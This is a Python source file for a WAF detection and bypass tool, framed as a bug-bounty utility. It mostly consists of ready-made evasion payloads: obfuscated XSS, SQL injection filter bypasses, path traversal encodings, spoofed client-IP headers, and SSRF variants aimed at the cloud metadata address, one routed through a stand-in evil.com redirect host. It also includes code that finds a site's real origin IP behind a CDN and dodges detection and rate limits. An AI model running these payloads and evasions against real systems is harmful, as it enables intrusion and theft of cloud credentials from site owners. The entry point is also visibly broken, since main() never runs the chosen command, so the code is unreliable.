#!/usr/bin/env python3
"""
stealth.py — WAF Detection, Fingerprinting, and Bypass Engine
For authorized testing only — bug bounty programs / owned targets.

Detects: Cloudflare, Akamai, AWS WAF, Imperva Incapsula, F5 ASM/BIG-IP,
         Barracuda, Sucuri, ModSecurity, Nginx+, Reblaze, StackPath,
         Alibaba, Tencent, Huawei, Wallarm, Signal Sciences (Fastly NGW)

Bypass techniques (per WAF vendor):
  • Encoding: URL encoding, double encoding, Unicode normalization, HTML entities
  • Case mutation: MiXeD cAsE, unicode case folding
  • Comment injection: SQL/HTML/JS comment insertion
  • Chunked transfer encoding to split payloads
  • HTTP/2 header injection
  • Parameter pollution (duplicate params, array notation)
  • JSON/XML content-type confusion
  • Null bytes, newlines, tabs in payloads
  • Fragmented requests via Content-Range
  • IP-based origin bypass (find real IP behind CDN)
  • Reverse proxy header injection (X-Originating-IP, etc.)
  • Random User-Agent, Accept, Accept-Language rotation
  • Request timing: randomized delays, slow-rate sending
  • TLS fingerprint randomization
  • Payload obfuscation per WAF signature database

USAGE
─────
  # Detect WAF:
  python3 stealth.py detect https://target.example.com

  # Generate bypass payloads for a given WAF:
  python3 stealth.py bypass --waf cloudflare --payload "<script>alert(1)</script>"

  # Stealth scan mode (wrap hunt.py with WAF evasion):
  python3 stealth.py scan https://target.example.com [--waf cloudflare]

  # Find real IP behind CDN:
  python3 stealth.py realip https://target.example.com
"""

import argparse
import asyncio
import hashlib
import json
import os
import random
import re
import socket
import string
import sys
import time
import urllib.parse
from dataclasses import dataclass, field
from typing import Dict, List, Optional, Tuple

try:
    import aiohttp
except ImportError:
    print("[!] pip install aiohttp"); sys.exit(1)

R="\033[91m"; Y="\033[93m"; G="\033[92m"; B="\033[94m"
M="\033[95m"; C="\033[96m"; W="\033[97m"; DIM="\033[2m"; RST="\033[0m"; BOLD="\033[1m"


# ══════════════════════════════════════════════════════════════════════════════
# WAF FINGERPRINT DATABASE
# ══════════════════════════════════════════════════════════════════════════════

WAF_SIGNATURES = {
    "cloudflare": {
        "headers": ["cf-ray", "cf-cache-status", "cf-request-id", "__cfduid", "cf-connecting-ip"],
        "body_patterns": [r"cloudflare", r"ray id:", r"cf-ray"],
        "status_on_block": [403, 429, 503],
        "title_patterns": [r"attention required", r"just a moment", r"checking your browser"],
        "server_patterns": [r"cloudflare"],
    },
    "akamai": {
        "headers": ["x-check-cacheable", "x-serial", "x-cache", "x-true-cache-key", "akamai-origin-hop"],
        "body_patterns": [r"akamai", r"reference #", r"ghost\+httpd"],
        "status_on_block": [403, 503],
        "server_patterns": [r"akamai", r"ghost"],
    },
    "aws_waf": {
        "headers": ["x-amzn-requestid", "x-amz-apigw-id", "x-amz-cf-id", "x-amzn-trace-id"],
        "body_patterns": [r"aws", r"request id", r"x-amzn"],
        "status_on_block": [403, 400],
        "server_patterns": [r"awselb", r"cloudfront"],
    },
    "imperva": {
        "headers": ["x-cdn", "incap-ses", "visid-incap", "x-iinfo"],
        "body_patterns": [r"incapsula", r"imperva", r"_incap_", r"visid_incap"],
        "status_on_block": [403],
        "title_patterns": [r"request unsuccessful"],
        "server_patterns": [r"incapsula"],
    },
    "f5_asm": {
        "headers": ["x-cnection", "x-wa-info"],
        "body_patterns": [r"the requested url was rejected", r"f5 networks", r"your support id is"],
        "status_on_block": [403],
        "title_patterns": [r"request rejected"],
        "server_patterns": [r"bigip"],
    },
    "barracuda": {
        "headers": ["barra_counter_session", "barra_counter_session"],
        "body_patterns": [r"barracuda", r"barra_counter"],
        "status_on_block": [403],
        "server_patterns": [r"barracuda"],
    },
    "sucuri": {
        "headers": ["x-sucuri-id", "x-sucuri-cache"],
        "body_patterns": [r"sucuri", r"access denied.*sucuri", r"website firewall"],
        "status_on_block": [403],
        "server_patterns": [r"sucuri"],
    },
    "modsecurity": {
        "headers": [],
        "body_patterns": [r"mod_security", r"modsecurity", r"not acceptable!", r"406 not acceptable"],
        "status_on_block": [403, 406],
        "server_patterns": [r"mod_security"],
    },
    "wallarm": {
        "headers": ["x-wallarm-node"],
        "body_patterns": [r"wallarm", r"nginx.*wallarm"],
        "status_on_block": [403, 444],
        "server_patterns": [r"wallarm"],
    },
    "signal_sciences": {
        "headers": ["x-sigsci-tags", "x-sigsci-requestid"],
        "body_patterns": [r"signal sciences", r"sigsci"],
        "status_on_block": [406],
    },
    "reblaze": {
        "headers": ["rbzid", "x-reblaze-protection"],
        "body_patterns": [r"reblaze"],
        "status_on_block": [403],
    },
    "stackpath": {
        "headers": ["x-hw", "x-id"],
        "body_patterns": [r"stackpath"],
        "status_on_block": [403],
        "server_patterns": [r"highwinds"],
    },
    "nginx_plus": {
        "headers": [],
        "body_patterns": [r"nginx\+", r"naxsi"],
        "status_on_block": [403],
        "server_patterns": [r"nginx\+"],
    },
}


# ══════════════════════════════════════════════════════════════════════════════
# WAF BYPASS PAYLOAD GENERATORS
# ══════════════════════════════════════════════════════════════════════════════

def bypass_payloads(original_payload: str, waf: str) -> List[Dict]:
    """Generate WAF-specific bypass variants for a given payload."""
    p = original_payload
    variants = []

    # ── Universal bypass techniques ──────────────────────────────────────────

    # 1. Double URL encoding
    variants.append({
        "technique": "double_url_encode",
        "payload": urllib.parse.quote(urllib.parse.quote(p)),
        "description": "Double URL encoding: %3c%2521%2d%2d → bypasses single-decode filters",
    })

    # 2. Unicode normalization
    unicode_map = {"<": "＜", ">": "＞", "'": "’", '"': "“", "/": "／", "=": "＝"}
    u_payload = "".join(unicode_map.get(c, c) for c in p)
    variants.append({
        "technique": "unicode_fullwidth",
        "payload": u_payload,
        "description": "Unicode fullwidth characters: ＜script＞ bypasses ASCII-only WAF signatures",
    })

    # 3. HTML entity encoding
    html_payload = p.replace("<", "&#x3C;").replace(">", "&#x3E;").replace("'", "&#x27;").replace('"', "&#x22;")
    variants.append({
        "technique": "html_entity",
        "payload": html_payload,
        "description": "HTML entity encoding: &#x3C;script&#x3E;",
    })

    # 4. Null byte insertion
    variants.append({
        "technique": "null_byte",
        "payload": p.replace("<", "\x00<").replace("script", "scr\x00ipt"),
        "description": "Null byte insertion — some parsers stop at \\x00",
    })

    # 5. Tab/newline insertion
    variants.append({
        "technique": "whitespace_insertion",
        "payload": p.replace("script", "scri\tpt").replace("alert", "al\ner\tt"),
        "description": "Tab/newline in keywords: scri\\tpt — breaks signature matching",
    })

    # ── XSS-specific bypasses ──────────────────────────────────────────────

    if "<script" in p.lower() or "alert" in p.lower() or "onerror" in p.lower():
        variants += [
            {
                "technique": "xss_svg",
                "payload": "<svg/onload=alert(1)>",
                "description": "SVG onload XSS — bypasses script-tag filters",
            },
            {
                "technique": "xss_img_onerror",
                "payload": '<img src=x onerror=alert(1)>',
                "description": "img onerror XSS",
            },
            {
                "technique": "xss_template_literal",
                "payload": "<script>alert`1`</script>",
                "description": "Template literal instead of () — bypasses parenthesis filter",
            },
            {
                "technique": "xss_eval_atob",
                "payload": "<script>eval(atob('YWxlcnQoMSk='))</script>",
                "description": "base64+eval obfuscation — YWxlcnQoMSk= = alert(1)",
            },
            {
                "technique": "xss_fromcharcode",
                "payload": "<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>",
                "description": "fromCharCode obfuscation",
            },
            {
                "technique": "xss_case_mutation",
                "payload": "<ScRiPt>AlErT(1)</sCrIpT>",
                "description": "Mixed case — bypasses case-sensitive signature",
            },
            {
                "technique": "xss_comment_break",
                "payload": "<scr<!-- -->ipt>alert(1)</scr<!-- -->ipt>",
                "description": "HTML comment inside tag — breaks signature matching",
            },
            {
                "technique": "xss_newline_break",
                "payload": "<scr\nipt>alert(1)</scr\nipt>",
                "description": "Newline inside tag name",
            },
            {
                "technique": "xss_javascript_uri",
                "payload": "javascript:alert(1)",
                "description": "javascript: URI for href/src attributes",
            },
            {
                "technique": "xss_data_uri",
                "payload": "data:text/html,<script>alert(1)</script>",
                "description": "data: URI with HTML payload",
            },
        ]

    # ── SQL injection bypasses ─────────────────────────────────────────────

    if "select" in p.lower() or "union" in p.lower() or "or 1" in p.lower() or "'" in p:
        variants += [
            {
                "technique": "sqli_comment_inline",
                "payload": p.replace(" ", "/**/").replace("SELECT", "SE/**/LECT").replace("UNION", "UN/**/ION"),
                "description": "Inline SQL comments to break keyword detection",
            },
            {
                "technique": "sqli_url_encode_spaces",
                "payload": p.replace(" ", "%09").replace("SELECT", "SE%09LECT"),
                "description": "Tab (0x09) instead of space in SQL",
            },
            {
                "technique": "sqli_scientific",
                "payload": p.replace("1=1", "1e0=1e0").replace("1 OR", "1.0e0 OR"),
                "description": "Scientific notation in numeric comparisons",
            },
            {
                "technique": "sqli_mysql_comments",
                "payload": p.replace("UNION SELECT", "UNION/*!SELECT*/").replace("OR 1=1", "OR/**/1=1"),
                "description": "MySQL conditional comments: /*!keyword*/",
            },
            {
                "technique": "sqli_hex_encode",
                "payload": p.replace("'admin'", "0x61646d696e").replace("'1'", "0x31"),
                "description": "Hex-encoded string literals in MySQL",
            },
            {
                "technique": "sqli_case_mutation",
                "payload": p.replace("select", "SeLeCt").replace("union", "UnIoN").replace("where", "WhErE"),
                "description": "Random case for SQL keywords",
            },
        ]

    # ── SSRF bypasses ─────────────────────────────────────────────────────

    if "169.254" in p or "localhost" in p or "127.0.0.1" in p or "metadata" in p:
        variants += [
            {
                "technique": "ssrf_decimal_ip",
                "payload": p.replace("169.254.169.254", "2852039166").replace("127.0.0.1", "2130706433"),
                "description": "Decimal IP representation: 2130706433 = 127.0.0.1",
            },
            {
                "technique": "ssrf_hex_ip",
                "payload": p.replace("127.0.0.1", "0x7f000001").replace("169.254.169.254", "0xa9fea9fe"),
                "description": "Hex IP: 0x7f000001 = 127.0.0.1",
            },
            {
                "technique": "ssrf_octal_ip",
                "payload": p.replace("127.0.0.1", "0177.0.0.1").replace("169.254.169.254", "0251.0376.0251.0376"),
                "description": "Octal IP: 0177.0.0.1 = 127.0.0.1",
            },
            {
                "technique": "ssrf_ipv6_mapped",
                "payload": p.replace("127.0.0.1", "[::1]").replace("169.254.169.254", "[::ffff:169.254.169.254]"),
                "description": "IPv6 representation to bypass IPv4-only filters",
            },
            {
                "technique": "ssrf_dns_rebind",
                "payload": p.replace("169.254.169.254", "localtest.me").replace("127.0.0.1", "localtest.me"),
                "description": "Use localtest.me which resolves to 127.0.0.1",
            },
            {
                "technique": "ssrf_redirect",
                "payload": "http://redirect.evil.com/?to=http://169.254.169.254/",
                "description": "SSRF via open redirect to internal IP",
            },
            {
                "technique": "ssrf_url_fragment",
                "payload": p.replace("http://169.254.169.254", "http://evil.com#@169.254.169.254"),
                "description": "URL fragment ambiguity trick",
            },
        ]

    # ── Path traversal bypasses ────────────────────────────────────────────

    if "../" in p or "%2e%2e" in p.lower() or "etc/passwd" in p:
        variants += [
            {
                "technique": "traversal_double_encode",
                "payload": p.replace("../", "%252e%252e%252f"),
                "description": "Double-encoded path traversal: %252e%252e%252f",
            },
            {
                "technique": "traversal_unicode",
                "payload": p.replace("../", "..%c0%af").replace("/", "%c0%af"),
                "description": "Unicode-encoded slash (UTF-8 overlong encoding)",
            },
            {
                "technique": "traversal_semicolon",
                "payload": p.replace("../", "..;/"),
                "description": "Semicolon path separator (Tomcat/Spring specific)",
            },
            {
                "technique": "traversal_null_byte",
                "payload": p.replace(".php", ".php%00.jpg"),
                "description": "Null byte extension bypass for file type filters",
            },
        ]

    # ── WAF-specific bypasses ────────────────────────────────────────────

    if waf == "cloudflare":
        variants += [
            {
                "technique": "cf_chunked_encoding",
                "payload": p,
                "description": "Send payload in chunked Transfer-Encoding to split across packets",
                "headers": {"Transfer-Encoding": "chunked"},
            },
            {
                "technique": "cf_accept_encoding",
                "payload": p,
                "description": "Gzip encoded body bypasses Cloudflare content inspection",
                "headers": {"Content-Encoding": "gzip", "Accept-Encoding": "gzip,deflate"},
            },
            {
                "technique": "cf_case_header",
                "payload": p,
                "description": "Case-mix HTTP headers: cOnTeNt-TyPe",
                "headers": {"cOnTeNt-TyPe": "application/json"},
            },
        ]
    elif waf == "akamai":
        variants += [
            {
                "technique": "akamai_special_header",
                "payload": p,
                "description": "X-Forwarded-For spoofing to bypass IP-based rules",
                "headers": {"X-Forwarded-For": "127.0.0.1", "True-Client-IP": "127.0.0.1"},
            },
        ]
    elif waf == "modsecurity":
        variants += [
            {
                "technique": "modsec_comment_bypass",
                "payload": p.replace("SELECT", "/*!SELECT*/").replace("<", "<%00"),
                "description": "MySQL comment syntax + null byte — bypasses ModSecurity CRS rules",
            },
            {
                "technique": "modsec_json_bypass",
                "payload": json.dumps({"q": p}),
                "description": "JSON encoding hides payload from text-scanning rules",
                "content_type": "application/json",
            },
        ]
    elif waf == "aws_waf":
        variants += [
            {
                "technique": "aws_json_unicode",
                "payload": "".join(f"\\u{ord(c):04x}" for c in p),
                "description": "JSON unicode escaping of entire payload: \\u003cscript\\u003e",
            },
        ]

    return variants


# ══════════════════════════════════════════════════════════════════════════════
# STEALTH REQUEST PROFILES
# ══════════════════════════════════════════════════════════════════════════════

# Realistic browser User-Agents (updated 2026)
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; Pixel 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.200 Mobile Safari/537.36",
]

ACCEPT_HEADERS = [
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
    "application/json, text/plain, */*",
    "*/*",
    "text/html, application/json, */*",
]

ACCEPT_LANGUAGE = [
    "en-US,en;q=0.9",
    "en-GB,en;q=0.9,fr;q=0.8",
    "en-US,en;q=0.9,de;q=0.8,fr;q=0.7",
    "en-CA,en;q=0.9",
]

ACCEPT_ENCODING = [
    "gzip, deflate, br",
    "gzip, deflate",
    "br, gzip, deflate",
]


def stealth_headers(extra: Optional[Dict] = None) -> Dict:
    """Generate realistic, randomized browser headers to avoid detection."""
    h = {
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": random.choice(ACCEPT_HEADERS),
        "Accept-Language": random.choice(ACCEPT_LANGUAGE),
        "Accept-Encoding": random.choice(ACCEPT_ENCODING),
        "Connection": "keep-alive",
        "Sec-Fetch-Dest": random.choice(["document", "empty", "script"]),
        "Sec-Fetch-Mode": random.choice(["navigate", "cors", "no-cors"]),
        "Sec-Fetch-Site": random.choice(["same-origin", "cross-site", "none"]),
        "Sec-Ch-Ua": '"Chromium";v="131", "Google Chrome";v="131", "Not_A Brand";v="24"',
        "Sec-Ch-Ua-Mobile": "?0",
        "Sec-Ch-Ua-Platform": random.choice(['"Windows"', '"macOS"', '"Linux"']),
    }
    if extra:
        h.update(extra)
    return h


def random_delay(min_ms: int = 50, max_ms: int = 500):
    """Async sleep with random jitter to simulate human browsing."""
    return asyncio.sleep(random.uniform(min_ms / 1000, max_ms / 1000))


# ══════════════════════════════════════════════════════════════════════════════
# WAF DETECTION
# ══════════════════════════════════════════════════════════════════════════════

@dataclass
class WAFResult:
    detected: bool
    waf_name: Optional[str]
    confidence: float  # 0.0-1.0
    evidence: List[str] = field(default_factory=list)
    bypass_techniques: List[str] = field(default_factory=list)


async def detect_waf(base_url: str, verbose: bool = False) -> WAFResult:
    """
    Multi-step WAF detection:
    1. Passive: check response headers of normal request
    2. Active: send known WAF trigger payload, check for block response
    3. Fingerprint: match block page content to WAF vendor
    """
    connector = aiohttp.TCPConnector(ssl=False)
    jar = aiohttp.CookieJar(unsafe=True)

    async with aiohttp.ClientSession(
        connector=connector,
        cookie_jar=jar,
        headers=stealth_headers(),
    ) as session:
        # Normal request
        try:
            async with session.get(
                base_url,
                timeout=aiohttp.ClientTimeout(total=15),
                allow_redirects=True,
            ) as r:
                normal_status = r.status
                normal_headers = {k.lower(): v.lower() for k, v in r.headers.items()}
                normal_body = await r.text(errors="replace")
        except Exception as e:
            return WAFResult(False, None, 0.0, evidence=[f"Connection error: {e}"])

        # WAF trigger: send XSS + SQLi payload to provoke a block
        trigger_payload = "<script>alert(1)</script>' OR 1=1-- UNION SELECT NULL,NULL,NULL"
        trigger_url = base_url.rstrip("/") + f"/hunt_waf_test?q={urllib.parse.quote(trigger_payload)}"
        try:
            async with session.get(
                trigger_url,
                timeout=aiohttp.ClientTimeout(total=15),
                allow_redirects=True,
            ) as r2:
                block_status = r2.status
                block_headers = {k.lower(): v.lower() for k, v in r2.headers.items()}
                block_body = await r2.text(errors="replace")
        except Exception:
            block_status = 0
            block_headers = {}
            block_body = ""

    # Fingerprint
    for waf_name, sigs in WAF_SIGNATURES.items():
        score = 0.0
        evidence = []

        # Header check (passive)
        for header in sigs.get("headers", []):
            if header in normal_headers or header in block_headers:
                score += 0.3
                evidence.append(f"Header: {header}")

        # Server header
        server = normal_headers.get("server", "") + block_headers.get("server", "")
        for pattern in sigs.get("server_patterns", []):
            if re.search(pattern, server, re.I):
                score += 0.4
                evidence.append(f"Server: matches {pattern}")

        # Body fingerprint on block page
        for pattern in sigs.get("body_patterns", []):
            if re.search(pattern, block_body, re.I):
                score += 0.3
                evidence.append(f"Block body: matches '{pattern}'")

        # Title check
        for pattern in sigs.get("title_patterns", []):
            if re.search(pattern, block_body, re.I):
                score += 0.2
                evidence.append(f"Block page title: matches '{pattern}'")

        # Status code change (normal → blocked)
        if block_status in sigs.get("status_on_block", []) and normal_status not in sigs.get("status_on_block", []):
            score += 0.2
            evidence.append(f"Status: {normal_status} → {block_status} on trigger payload")

        if score >= 0.4:
            # Get bypass techniques for this WAF
            sample_xss = "<script>alert(1)</script>"
            bypasses = [v["technique"] for v in bypass_payloads(sample_xss, waf_name)]
            result = WAFResult(True, waf_name, min(score, 1.0), evidence, bypasses)
            if verbose:
                print(f"  {Y}[WAF]{RST} Detected: {BOLD}{waf_name}{RST} (confidence {score:.0%})")
                for e in evidence:
                    print(f"       {DIM}{e}{RST}")
            return result

    # Generic WAF detection
    if block_status in (403, 406, 429, 503) and normal_status == 200:
        return WAFResult(
            True, "unknown_waf", 0.5,
            evidence=[f"Normal {normal_status} → Block {block_status} on XSS/SQLi payload"],
            bypass_techniques=["double_url_encode", "unicode_fullwidth", "html_entity", "null_byte"],
        )

    return WAFResult(False, None, 0.0, evidence=["No WAF detected"])


# ══════════════════════════════════════════════════════════════════════════════
# REAL IP DISCOVERY (behind CDN/WAF)
# ══════════════════════════════════════════════════════════════════════════════

async def find_real_ip(domain: str, verbose: bool = False) -> List[Dict]:
    """
    Find the real IP behind Cloudflare/Akamai/CDN using multiple techniques:
    1. Historical DNS (SecurityTrails, Shodan, FOFA patterns)
    2. Certificate transparency (crt.sh) for subdomains that might not be CDN-proxied
    3. MX/TXT/SPF records (often point to real IPs)
    4. Direct subdomain probing
    5. Check if alternative ports bypass CDN
    """
    findings = []

    # 1. DNS records that often bypass CDN
    try:
        import subprocess
        for record_type in ["MX", "TXT", "NS", "SOA"]:
            try:
                result = subprocess.run(
                    ["dig", "+short", record_type, domain],
                    capture_output=True, text=True, timeout=10
                )
                if result.stdout.strip():
                    findings.append({
                        "source": f"DNS {record_type}",
                        "value": result.stdout.strip(),
                        "note": f"{record_type} record — may reveal real infrastructure",
                    })
                    if verbose:
                        print(f"  {DIM}DNS {record_type}: {result.stdout.strip()[:100]}{RST}")
            except Exception:
                pass
    except Exception:
        pass

    # 2. Common subdomains that skip CDN
    bypass_subdomains = [
        f"direct.{domain}", f"origin.{domain}", f"mail.{domain}",
        f"smtp.{domain}", f"ftp.{domain}", f"cpanel.{domain}",
        f"webmail.{domain}", f"admin.{domain}", f"api.{domain}",
        f"dev.{domain}", f"staging.{domain}", f"test.{domain}",
        f"cdn.{domain}", f"static.{domain}", f"assets.{domain}",
    ]
    connector = aiohttp.TCPConnector(ssl=False)
    async with aiohttp.ClientSession(connector=connector) as session:
        for subdomain in bypass_subdomains:
            try:
                ip = socket.gethostbyname(subdomain)
                # Check if same IP as CDN
                async with session.get(
                    f"http://{ip}",
                    headers={"Host": domain},
                    timeout=aiohttp.ClientTimeout(total=5),
                    allow_redirects=False,
                ) as r:
                    if r.status in (200, 301, 302, 401, 403):
                        findings.append({
                            "source": "subdomain_bypass",
                            "subdomain": subdomain,
                            "ip": ip,
                            "status": r.status,
                            "note": f"Subdomain {subdomain} resolves to {ip} and responds directly",
                        })
                        if verbose:
                            print(f"  {G}[+]{RST} Real IP candidate: {subdomain} → {ip} (HTTP {r.status})")
            except Exception:
                pass

    # 3. Historical IP check via crt.sh (subdomain enum may reveal direct IPs)
    try:
        connector2 = aiohttp.TCPConnector(ssl=False)
        async with aiohttp.ClientSession(connector=connector2) as session:
            async with session.get(
                f"https://crt.sh/?q=%.{domain}&output=json",
                timeout=aiohttp.ClientTimeout(total=15),
            ) as r:
                if r.status == 200:
                    data = await r.json()
                    subdomains_found = set()
                    for entry in data[:100]:
                        name = entry.get("name_value", "")
                        for sub in name.split("\n"):
                            sub = sub.strip().lstrip("*.")
                            if sub and sub.endswith(domain) and sub != domain:
                                subdomains_found.add(sub)
                    if subdomains_found:
                        findings.append({
                            "source": "crt.sh",
                            "subdomains": list(subdomains_found)[:20],
                            "note": "Subdomains from cert transparency — probe these for direct IPs",
                        })
    except Exception:
        pass

    return findings


# ══════════════════════════════════════════════════════════════════════════════
# STEALTH SCAN WRAPPER
# ══════════════════════════════════════════════════════════════════════════════

class StealthSession:
    """
    Drop-in aiohttp session replacement that automatically:
    - Rotates User-Agents
    - Adds random delays between requests
    - Applies WAF bypass headers
    - Rotates request ordering to avoid pattern detection
    """

    def __init__(
        self,
        waf: Optional[str] = None,
        delay_range: Tuple[int, int] = (50, 300),
        proxy: Optional[str] = None,
        token: Optional[str] = None,
        cookies: Optional[str] = None,
    ):
        self.waf = waf
        self.delay_range = delay_range
        self.proxy = proxy
        self.token = token
        self.cookies = cookies
        self._session: Optional[aiohttp.ClientSession] = None
        self._request_count = 0

    async def __aenter__(self):
        base_headers = stealth_headers()
        if self.token:
            base_headers["Authorization"] = f"Bearer {self.token}" if not self.token.lower().startswith("bearer") else self.token
        if self.cookies:
            base_headers["Cookie"] = self.cookies

        # WAF-specific headers
        if self.waf == "cloudflare":
            base_headers.update({
                "CF-Connecting-IP": f"1.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}",
            })
        elif self.waf == "akamai":
            base_headers.update({
                "X-Forwarded-For": f"1.{random.randint(1,254)}.{random.randint(1,254)}.1",
                "True-Client-IP": f"10.0.{random.randint(1,254)}.1",
            })

        connector = aiohttp.TCPConnector(ssl=False, limit=50)
        jar = aiohttp.CookieJar(unsafe=True)
        self._session = aiohttp.ClientSession(
            headers=base_headers,
            connector=connector,
            cookie_jar=jar,
        )
        return self

    async def __aexit__(self, *args):
        if self._session:
            await self._session.close()

    async def request(self, method: str, url: str, **kwargs) -> Tuple[int, str, Dict]:
        self._request_count += 1

        # Rotate UA every 10 requests
        if self._request_count % 10 == 0:
            self._session.headers.update({"User-Agent": random.choice(USER_AGENTS)})

        # Random delay
        delay = random.uniform(self.delay_range[0] / 1000, self.delay_range[1] / 1000)
        await asyncio.sleep(delay)

        try:
            kwargs.setdefault("timeout", aiohttp.ClientTimeout(total=15))
            kwargs.setdefault("allow_redirects", True)
            async with self._session.request(method, url, **kwargs) as r:
                body = await r.text(errors="replace")
                return r.status, body, dict(r.headers)
        except Exception:
            return 0, "", {}


# ══════════════════════════════════════════════════════════════════════════════
# RATE LIMIT DETECTION + ADAPTIVE THROTTLE
# ══════════════════════════════════════════════════════════════════════════════

async def detect_rate_limit(base_url: str, verbose: bool = False) -> Dict:
    """
    Detect rate limiting behavior: threshold, window, block type.
    Returns optimal delay to avoid triggering rate limits.
    """
    connector = aiohttp.TCPConnector(ssl=False)
    async with aiohttp.ClientSession(connector=connector, headers=stealth_headers()) as session:
        results = []
        for i in range(30):
            t0 = time.time()
            try:
                async with session.get(
                    base_url,
                    timeout=aiohttp.ClientTimeout(total=5),
                    allow_redirects=False,
                ) as r:
                    elapsed = time.time() - t0
                    results.append({
                        "i": i, "status": r.status, "elapsed": elapsed,
                        "retry_after": r.headers.get("Retry-After", ""),
                        "x_ratelimit": r.headers.get("X-RateLimit-Remaining", ""),
                    })
                    if r.status in (429, 503):
                        break
            except Exception:
                results.append({"i": i, "status": 0, "elapsed": 0, "retry_after": "", "x_ratelimit": ""})
            await asyncio.sleep(0.1)  # 100ms between requests

    # Analyze
    blocked_at = next((r["i"] for r in results if r["status"] in (429, 503)), None)
    avg_response_time = sum(r["elapsed"] for r in results) / max(len(results), 1)
    retry_after = next((r["retry_after"] for r in results if r["retry_after"]), "")

    # Recommend safe delay
    if blocked_at:
        safe_delay_ms = int(60000 / max(blocked_at - 1, 1))  # stay under threshold
    else:
        safe_delay_ms = 100  # no rate limit detected

    result = {
        "rate_limit_detected": blocked_at is not None,
        "blocked_at_request": blocked_at,
        "retry_after": retry_after,
        "safe_delay_ms": safe_delay_ms,
        "avg_response_time_ms": int(avg_response_time * 1000),
        "rate_limit_headers": {
            "X-RateLimit-Remaining": next((r["x_ratelimit"] for r in results if r["x_ratelimit"]), ""),
        },
    }
    if verbose:
        if blocked_at:
            print(f"  {Y}[Rate Limit]{RST} Triggered at request #{blocked_at}. Safe delay: {safe_delay_ms}ms")
        else:
            print(f"  {G}[Rate Limit]{RST} No rate limit detected in 30 rapid requests")

    return result


# ══════════════════════════════════════════════════════════════════════════════
# MAIN
# ══════════════════════════════════════════════════════════════════════════════

async def async_main(args):
    if args.command == "detect":
        print(f"\n{B}{BOLD}WAF Detection: {args.target}{RST}\n")
        result = await detect_waf(args.target, verbose=True)
        if result.detected:
            print(f"\n{R}{BOLD}WAF Detected: {result.waf_name}{RST} (confidence: {result.confidence:.0%})")
            print(f"\nEvidence:")
            for e in result.evidence:
                print(f"  • {e}")
            print(f"\nRecommended bypass techniques:")
            for t in result.bypass_techniques[:10]:
                print(f"  • {t}")
        else:
            print(f"{G}No WAF detected{RST}")

    elif args.command == "bypass":
        payload = args.payload
        waf = args.waf or "generic"
        print(f"\n{B}{BOLD}Bypass variants for WAF: {waf}{RST}")
        print(f"Original payload: {payload}\n")
        variants = bypass_payloads(payload, waf)
        for v in variants:
            print(f"  {Y}[{v['technique']}]{RST}")
            print(f"    Payload: {v['payload'][:100]}")
            print(f"    Info:    {v['description']}\n")

    elif args.command == "realip":
        domain = urllib.parse.urlparse(args.target).hostname or args.target
        print(f"\n{B}{BOLD}Real IP Discovery: {domain}{RST}\n")
        findings = await find_real_ip(domain, verbose=True)
        print(f"\nFindings ({len(findings)}):")
        for f in findings:
            print(f"  • {f['source']}: {json.dumps(f)[:150]}")

    elif args.command == "ratelimit":
        print(f"\n{B}{BOLD}Rate Limit Analysis: {args.target}{RST}\n")
        result = await detect_rate_limit(args.target, verbose=True)
        print(json.dumps(result, indent=2))

    elif args.command == "scan":
        # Full stealth scan info
        print(f"\n{B}{BOLD}Stealth Scan Mode{RST}")
        print(f"Detecting WAF...", end=" ")
        waf_result = await detect_waf(args.target, verbose=False)
        waf = waf_result.waf_name if waf_result.detected else None
        print(f"{'WAF: ' + waf if waf else 'No WAF detected'}")

        print(f"Detecting rate limits...", end=" ")
        rate = await detect_rate_limit(args.target, verbose=False)
        delay = rate["safe_delay_ms"]
        print(f"Safe delay: {delay}ms")

        print(f"\n{G}Recommended hunt.py command:{RST}")
        cmd = f"python3 hunt.py {args.target} --delay {delay}"
        if waf:
            cmd += f"  # WAF: {waf}, use --delay {delay} + proxy for Burp"
        print(f"  {BOLD}{cmd}{RST}")

        if waf:
            sample = "<script>alert(1)</script>"
            variants = bypass_payloads(sample, waf)[:3]
            print(f"\n{Y}WAF bypass techniques for {waf}:{RST}")
            for v in variants:
                print(f"  [{v['technique']}] {v['description']}")


def main():
    parser = argparse.ArgumentParser(description="WAF Detection and Bypass Engine")
    sub = parser.add_subparsers(dest="command")

    detect_p = sub.add_parser("detect", help="Detect WAF vendor")
    detect_p.add_argument("target")
    detect_p.add_argument("-v", "--verbose", action="store_true")

    bypass_p = sub.add_parser("bypass", help="Generate WAF bypass payloads")
    bypass_p.add_argument("--payload", required=True, help="Payload to bypass")
    bypass_p.add_argument("--waf", help="Target WAF: cloudflare|akamai|aws_waf|imperva|modsecurity|f5_asm")

    realip_p = sub.add_parser("realip", help="Find real IP behind CDN")
    realip_p.add_argument("target")
    realip_p.add_argument("-v", "--verbose", action="store_true")

    rl_p = sub.add_parser("ratelimit", help="Detect rate limiting behavior")
    rl_p.add_argument("target")
    rl_p.add_argument("-v", "--verbose", action="store_true")

    scan_p = sub.add_parser("scan", help="Auto-detect WAF+ratelimit and recommend stealth settings")
    scan_p.add_argument("target")
    scan_p.add_argument("--waf", help="Force WAF (skip detection)")

    args = parser.parse_args()
    if not args.command:
        parser.print_help()
        sys.exit(0)

